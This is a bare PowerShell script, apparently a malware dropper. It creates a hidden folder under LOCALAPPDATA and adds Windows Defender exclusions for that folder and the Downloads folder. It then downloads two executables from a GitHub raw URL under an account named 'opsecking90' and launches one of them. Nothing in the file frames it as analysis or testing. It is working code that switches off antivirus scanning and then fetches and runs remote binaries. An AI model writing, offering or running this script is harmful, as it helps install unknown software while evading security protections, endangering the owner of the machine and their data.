

$ErrorActionPreference = "Stop"

$ArFolder = "$env:LOCALAPPDATA\Ar"
$DownloadsFolder = (New-Object -ComObject Shell.Application).NameSpace('shell:Downloads').Self.Path

$ArHostUrl = "https://raw.githubusercontent.com/opsecking90/problem/main/ArHost.exe"
$ArExeUrl   = "https://raw.githubusercontent.com/opsecking90/problem/main/ar.exe"

if (-not (Test-Path $ArFolder)) {
    New-Item -ItemType Directory -Path $ArFolder -Force | Out-Null
} else {
    Write-Host "!Stop"
}


Add-MpPreference -ExclusionPath $ArFolder
Add-MpPreference -ExclusionPath $DownloadsFolder



Invoke-WebRequest -Uri $ArHostUrl -OutFile "$ArFolder\ArHost.exe"



Invoke-WebRequest -Uri $ArExeUrl -OutFile "$ArFolder\ar.exe"



Start-Process -FilePath "$ArFolder\ArHost.exe" -WorkingDirectory $ArFolder


